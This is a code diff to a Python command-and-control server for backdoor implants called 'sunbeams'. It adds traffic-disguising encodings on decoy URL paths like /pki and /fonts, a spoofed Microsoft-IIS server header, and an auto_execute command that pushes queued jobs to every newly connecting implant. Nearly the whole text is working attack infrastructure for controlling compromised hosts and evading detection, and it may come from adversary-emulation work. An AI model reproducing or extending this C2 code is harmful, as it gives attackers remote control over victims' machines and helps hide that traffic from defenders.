@@ -15,7 +15,7 @@ import re
 from socketserver import ThreadingMixIn
 import threading
 from http.server import HTTPServer, BaseHTTPRequestHandler
-
+import random
 
 seed()
 
@@ -200,6 +200,10 @@ class Sunbeam:
 
 class C2HTTPHandler(BaseHTTPRequestHandler):
 
+    ENCODING_SCHEME_XML = 1
+    ENCODING_SCHEME_SKIP_12 = 2
+    ENCODING_SCHEME_SKIP_48 = 3
+
     def log_message(self, format, *args):
         return
 
@@ -253,19 +257,25 @@ class C2HTTPHandler(BaseHTTPRequestHandler):
             return
         self.send_response(200)
         self.end_headers()
-        if request_body:
-            print("received POST/PUT:")
         message = ""
         self.wfile.write(message.encode())
         return
 
     def handle_initial_request(self):
         message = ""
+        encoding_scheme = None
+        if self.path.startswith("/pki"):
+            encoding_scheme = self.ENCODING_SCHEME_SKIP_12
+        elif self.path.startswith("/fonts"):
+            encoding_scheme = self.ENCODING_SCHEME_SKIP_48
+        elif self.path.startswith("/swip"):
+            encoding_scheme = self.ENCODING_SCHEME_XML
         encoded_userid = self.headers.get('If-None-Match')
-        if encoded_userid is None:
+        if encoded_userid is None or encoding_scheme is None:
             self.send_response(200)
             self.end_headers()
             return
+
         sunbeam_userid = CryptoHelper.decode_if_none_header(encoded_userid)
         if sunbeam_userid in self.server.sunbeams:
             sunbeam = self.server.sunbeams[sunbeam_userid]
@@ -273,6 +283,7 @@ class C2HTTPHandler(BaseHTTPRequestHandler):
         else:
             sunbeam = Sunbeam(sunbeam_userid)
             log.info("New sunbeam found: {}".format(sunbeam_userid))
+            sunbeam.jobs += self.server.auto_execute_jobs
             self.server.sunbeams[sunbeam_userid] = sunbeam
         if len(sunbeam.jobs) == 0:
             # default job. This job will keep the backdoor channel alive
@@ -286,17 +297,26 @@ class C2HTTPHandler(BaseHTTPRequestHandler):
         data_bytes = []
         data_bytes += message_size_dword
         data_bytes += data_inflated
-        message = CryptoHelper.encode_data_xml(data_bytes)
+        content_type = "application/octet-stream"
+        if encoding_scheme == self.ENCODING_SCHEME_XML:
+            message = CryptoHelper.encode_data_xml(data_bytes).encode()
+            content_type = "application/xml"
+        elif encoding_scheme == self.ENCODING_SCHEME_SKIP_12:
+            message = bytes([random.randint(0, 255) for i in range(12)] + data_bytes)
+        elif encoding_scheme == self.ENCODING_SCHEME_SKIP_48:
+            message = bytes([random.randint(0, 255) for i in range(48)] + data_bytes)
         headers = "HTTP/1.1 200 OK\r\n" \
-                  "Content-Type: application/xml\r\n" \
+                  "Content-Type: {}\r\n" \
                   "Server: Microsoft-IIS/10.0\r\n" \
                   "\r\n"
-        self.wfile.write((headers + message).encode())
+        headers = headers.format(content_type)
+        self.wfile.write((headers.encode() + message))
 
 
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
     def __init__(self, server_address):
         self.sunbeams = dict()
+        self.auto_execute_jobs = []
         HTTPServer.__init__(self, server_address, C2HTTPHandler)
 
 
@@ -334,6 +354,22 @@ class MainMenu(cmd.Cmd):
             table_headers = re.findall(r'\s*([^=,]*)=\s*[^,]*,?', str(list(self.c2server.sunbeams.values())[0]))
             table = tabulate(table_values, headers=table_headers)
             print(table)
+
+    def do_auto_execute(self, arg):
+        args = arg.split(" ")
+        if len(args) < 2:
+            log.error("Invalid argument. Expected arguments: job_id job_parameters")
+            return
+        try:
+            job_type = int(args[0].strip())
+        except:
+            log.error("Invalid argument. Expected arguments: job_id job_parameters")
+            return
+        parameters = " ".join(args[1:])
+        job_type = Sunbeam.Job.Type(job_type)
+        job = Sunbeam.Job(job_type, parameters)
+        self.c2server.auto_execute_jobs.append(job)
+        print("\tSunbeam will process the next auto execute job in the queue on its next HTTP response")
 
     def do_execute(self, arg):
         args = arg.split(" ")
